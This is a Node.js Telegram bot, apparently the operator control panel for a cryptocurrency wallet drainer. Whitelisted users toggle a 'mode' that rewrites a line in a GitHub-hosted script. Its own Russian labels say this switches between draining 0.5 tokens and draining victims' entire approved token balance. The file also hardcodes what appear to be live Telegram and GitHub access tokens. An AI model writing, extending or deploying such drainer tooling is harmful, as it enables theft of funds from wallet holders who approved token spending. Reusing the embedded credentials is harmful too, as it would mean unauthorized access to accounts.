import TelegramBot from 'node-telegram-bot-api';
import { Octokit } from '@octokit/core';
import { promises as fs } from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

// Загрузка переменных окружения
dotenv.config();

// Конфигурация
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7236925097:AAGp_2L2Mw8lfDtdk5LAvteDu3WrPGBHQIw';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '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';
const ALLOWED_USER_IDS = [8168762788, 7162561479, 7590707726];
const REPO = process.env.GITHUB_REPO || 'NewV2';
const FILE_PATH = process.env.GITHUB_FILE_PATH || 'src/main.js';
const OWNER = process.env.GITHUB_OWNER || 'AmnesiaNUACHO';
const MODE_DEFAULT = '🔴';
const MODE_UNMODE = '🟢';

// Получение __dirname для ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Инициализация бота
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Инициализация GitHub API
const octokit = new Octokit({ auth: GITHUB_TOKEN });

// Антиспам: словарь для отслеживания времени последнего действия
const userTimestamps = new Map();
const RATE_LIMIT = 2; // 2 запроса в секунду
const TIME_WINDOW = 1000; // 1 секунда

// Состояние режима (хранится в файле для персистентности)
let currentMode = MODE_DEFAULT;

// Загрузка текущего режима из файла
async function loadMode() {
  try {
    const data = await fs.readFile(path.join(__dirname, 'mode.json'), 'utf8');
    const { mode } = JSON.parse(data);
    currentMode = mode === MODE_UNMODE ? MODE_UNMODE : MODE_DEFAULT;
    console.log(`Mode loaded: ${currentMode}`);
  } catch (error) {
    console.log('Mode file not found, using default mode');
    currentMode = MODE_DEFAULT;
    await saveMode();
  }
}

// Сохранение режима в файл
async function saveMode() {
  try {
    await fs.writeFile(path.join(__dirname, 'mode.json'), JSON.stringify({ mode: currentMode }));
    console.log(`Mode saved: ${currentMode}`);
  } catch (error) {
    console.error('Error saving mode:', error);
  }
}

// Проверка антиспама
function checkRateLimit(userId) {
  const now = Date.now();
  const timestamps = userTimestamps.get(userId) || [];
  const validTimestamps = timestamps.filter(ts => now - ts < TIME_WINDOW);
  
  if (validTimestamps.length >= RATE_LIMIT) {
    return false;
  }
  
  validTimestamps.push(now);
  userTimestamps.set(userId, validTimestamps);
  return true;
}

// Создание начальной клавиатуры
function getStartKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: 'Profile', callback_data: 'profile' },
        { text: 'General', callback_data: 'general' }
      ]
    ]
  };
}

// Создание клавиатуры для профиля
function getProfileKeyboard() {
  return {
    inline_keyboard: [[{ text: 'Back', callback_data: 'back_start' }]]
  };
}

// Создание клавиатуры для настроек
function getGeneralKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: `Mode ${currentMode === MODE_DEFAULT ? MODE_UNMODE : MODE_DEFAULT}`, callback_data: 'toggle_mode' },
        { text: 'Back', callback_data: 'back_start' }
      ]
    ]
  };
}

// Обновление файла на GitHub
async function updateGitHubFile(newContent) {
  try {
    const { data: file } = await octokit.request('GET /repos/{owner}/{repo}/contents/{path}', {
      owner: OWNER,
      repo: REPO,
      path: FILE_PATH
    });

    await octokit.request('PUT /repos/{owner}/{repo}/contents/{path}', {
      owner: OWNER,
      repo: REPO,
      path: FILE_PATH,
      message: `Update mode to ${currentMode}`, // Исправлено: используем template literal
      content: Buffer.from(newContent, 'utf8').toString('base64'),
      sha: file.sha
    });
    console.log('File updated on GitHub');
  } catch (error) {
    console.error('Error updating GitHub file:', error);
    throw new Error('Failed to update GitHub file');
  }
}

// Переключение режима и обновление кода
async function toggleMode() {
  try {
    const { data: file } = await octokit.request('GET /repos/{owner}/{repo}/contents/{path}', {
      owner: OWNER,
      repo: REPO,
      path: FILE_PATH
    });

    const content = Buffer.from(file.content, 'base64').toString('utf8');
    
    const newMode = currentMode === MODE_DEFAULT ? MODE_UNMODE : MODE_DEFAULT;
    
    // Исправлено: правильное экранирование кавычек
    const targetLine = currentMode === MODE_DEFAULT
      ? 'const amount = parseUnits("0.5", mostExpensive.decimals)'
      : 'const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)';
    
    const regex = currentMode === MODE_DEFAULT
      ? /const amount = parseUnits\(mostExpensive\.balance\.toString\(\), mostExpensive\.decimals\)/
      : /const amount = parseUnits\("0\.5", mostExpensive\.decimals\)/;
    
    if (!regex.test(content)) {
      throw new Error('Target line not found in file');
    }
    
    const newContent = content.replace(regex, targetLine);
    
    await updateGitHubFile(newContent);
    
    currentMode = newMode;
    await saveMode();
    
    return `Mode switched to ${currentMode}`;
  } catch (error) {
    console.error('Error toggling mode:', error);
    return `Mode switch failed: ${error.message}`;
  }
}

// Обработчик команды /start
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!ALLOWED_USER_IDS.includes(userId)) {
    return bot.sendMessage(chatId, 'Access denied.');
  }

  const keyboard = getStartKeyboard();
  await bot.sendMessage(chatId, 'Hello', {
    reply_markup: keyboard
  });
});

// Обработчик callback-запросов
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;

  if (!checkRateLimit(userId)) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: 'Too many requests. Please wait a moment.',
      show_alert: true
    });
  }

  if (!ALLOWED_USER_IDS.includes(userId)) {
    return bot.sendMessage(chatId, 'Access denied.');
  }

  try {
    if (data === 'profile') {
      const user = callbackQuery.from;
      const profileText = `id: ${user.id}\nUsername: ${user.username || 'None'}`;
      
      // Исправлено: удалена лишняя переменная currentMode
      await bot.editMessageText(profileText, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: getProfileKeyboard()
      });
    } else if (data === 'general') {
      // Исправлено: опечатка "settigns" → "settings"
      await bot.editMessageText('General settings\n\n⚠️ Mode 🟢 - состояние дрейнера, которое списывает весь аппрувнуты баланс\nMode 🔴 - состояние, когда списывается 0.5 токенов(или можно установить 1)', {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: getGeneralKeyboard()
      });
    } else if (data === 'back_start') {
      await bot.editMessageText('Hello', {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: getStartKeyboard()
      });
    } else if (data === 'toggle_mode') {
      const result = await toggleMode();
      console.log('Toggle mode result:', result); // Логируем результат
      
      await bot.editMessageText('General settings\n\n⚠️ Mode 🟢 - состояние дрейнера, которое списывает весь аппрувнуты баланс\nMode 🔴 - состояние, когда списывается 0.5 токенов(или можно установить 1)', {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: getGeneralKeyboard()
      });
    }

    await bot.answerCallbackQuery(callbackQuery.id);
  } catch (error) {
    console.error('Error handling callback:', error);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: 'An error occurred. Please try again.',
      show_alert: true
    });
  }
});

// Обработка ошибок бота
bot.on('error', (error) => {
  console.error('Bot error:', error);
});

// Обработка завершения процесса
process.on('SIGINT', () => {
  console.log('Bot is shutting down...');
  bot.stopPolling();
  process.exit(0);
});

// Инициализация
(async () => {
  try {
    await loadMode();
    console.log('Bot started successfully');
  } catch (error) {
    console.error('Error starting bot:', error);
    process.exit(1);
  }
})();